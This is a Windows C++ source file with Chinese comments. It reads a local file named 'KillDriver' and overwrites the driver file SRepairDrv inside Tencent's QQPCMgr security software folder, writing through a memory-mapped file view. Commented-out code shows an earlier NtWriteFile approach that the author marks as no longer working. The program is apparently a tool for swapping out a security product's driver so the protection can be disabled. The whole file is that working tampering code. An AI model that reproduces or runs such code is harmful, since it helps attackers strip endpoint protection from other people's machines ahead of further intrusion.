
#include <Windows.h>
#include <tchar.h>

////声明NtWriteFile 及其参数类型
////此方法已失效
//typedef struct _IO_STATUS_BLOCK {
//	union {
//		NTSTATUS Status;
//		PVOID Pointer;
//	} DUMMYUNIONNAME;
//
//	ULONG_PTR Information;
//} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
//
//typedef
//VOID
//(NTAPI *PIO_APC_ROUTINE) (
//_In_ PVOID ApcContext,
//_In_ PIO_STATUS_BLOCK IoStatusBlock,
//_In_ ULONG Reserved
//);
//
//typedef
//NTSTATUS
//(*NtWriteFile)(
//__in HANDLE FileHandle,
//__in_opt HANDLE Event,
//__in_opt PIO_APC_ROUTINE ApcRoutine,
//__in_opt PVOID ApcContext,
//__out PIO_STATUS_BLOCK IoStatusBlock,
//__in_bcount(Length) PVOID Buffer,
//__in ULONG Length,
//__in_opt PLARGE_INTEGER ByteOffset,
//__in_opt PULONG Key
//);

int _tmain(int argc, _TCHAR* argv[])
{
	////把指定目录下的文件覆盖 到键值目录下的文件
	
	HANDLE hFile= CreateFile(L"C:\\KillDriver",GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}
	DWORD FileSizeHigh;
	DWORD FileSizeLow;
	FileSizeLow = GetFileSize(hFile, &FileSizeHigh);

	BYTE* Buf = new BYTE[FileSizeLow];

	DWORD error = ReadFile(hFile, Buf, FileSizeLow, &FileSizeHigh, NULL);
	if (error == 0)
	{
		return FALSE;
	}

	//创建新文件覆盖原文件
	HANDLE hFile2 = CreateFile(L"C:\\Program Files\\Tencent\\QQPCMgr\\SRepairDrv", 
		GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile2 == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	////获取NtWriteFile,采用NtWriteFile写入文件。
	////此处失效
	//
	//HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
	//NtWriteFile RNtWriteFile = (NtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
	//
	//IO_STATUS_BLOCK FunRent = {};
	//
	//PLARGE_INTEGER oFFset = 0;
	//RNtWriteFile(hFile2, NULL, NULL, NULL, &FunRent, Buf, FileSizeLow, oFFset, NULL);
	//DWORD error = GetLastError();


	//采用文件映射,写入文件。
	HANDLE hFileMap = CreateFileMapping(hFile2, NULL, PAGE_READWRITE, 0, FileSizeLow, NULL);
	if (hFileMap == NULL)
	{
		return FALSE;
	}

	//映射映射视图
	PVOID MapFileAddress = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, FileSizeLow);
	if (MapFileAddress == NULL)
	{
		return FALSE;
	}

	//拷贝buf进映射视图
	memcpy(MapFileAddress, Buf, FileSizeLow);

	//映射到磁盘文件
	FlushViewOfFile(MapFileAddress, FileSizeLow);

	UnmapViewOfFile(MapFileAddress);

		CloseHandle(hFile);
		CloseHandle(hFile2);
		CloseHandle(hFileMap);
		delete[]Buf;
	
		return 0;
}
